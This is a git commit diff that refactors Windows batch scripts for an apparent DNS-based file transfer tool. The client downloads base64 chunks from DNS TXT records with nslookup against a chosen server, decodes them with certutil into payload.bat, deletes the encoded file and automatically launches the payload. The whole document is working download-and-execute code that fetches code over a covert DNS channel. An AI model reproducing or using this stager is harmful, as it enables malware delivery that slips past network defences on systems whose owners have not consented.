0138ae665afb27e95e30f994198052367eec0588
daniel <daniel@armani.vinakovsky.com>
2015-08-18 20:05:40 -0400

    cleaned up code;

--- client/client_batch/dnsftp_downloader.bat
+++ client/client_batch/dnsftp_downloader.bat
@@ -2,4 +2,4 @@ REM Written by Daniel Vinakovsky
 REM dvinak@gmail.com
 REM http://www.gnurds.com
 @echo off
-nslookup -q=txt %1.armani.vinakovsky.com 192.168.2.5
+nslookup -q=txt %1 192.168.2.5
--- client/client_batch/runme.bat
+++ client/client_batch/runme.bat
@@ -6,11 +6,11 @@ REM http://www.gnurds.com
 setlocal EnableDelayedExpansion
 set encodedoutfile=outputb64
 set rawoutfile=payload.bat
+set dnsserver=%1
 
-REM set for loop range to how many pieces of the file there will be (the python server script should tell you)
-FOR /L %%I IN (0,1,0) DO (
-	ECHO %%I
-	FOR /f "skip=12 usebackq tokens=1" %%a IN (`dnsftp_downloader.bat %%I`) DO (
+FOR /L %%I IN (0,1,%2) DO (
+	ECHO Downloaded part %%I of %2
+	FOR /f "skip=12 usebackq tokens=1" %%a IN (`dnsftp_downloader.bat %%I.%dnsserver%`) DO (
 		set tempvar=%%a
 		REM strip quotation marks
 		set output=!tempvar:"=!
@@ -18,8 +18,10 @@ FOR /L %%I IN (0,1,0) DO (
 		)
 )
 REM base64 decode the downloaded payload, overwrite.
-certutil -decode -f %encodedoutfile% %rawoutfile%
-REM delete teh encoded payload
-del %encodedoutfile%
+ECHO Decoding downloaded file...
+certutil -decode -f %encodedoutfile% %rawoutfile% > NUL
+REM delete the encoded payload
+DEL %encodedoutfile%
 REM launch the payload
+ECHO Attempting to launch file...
 start "" "payload.bat"
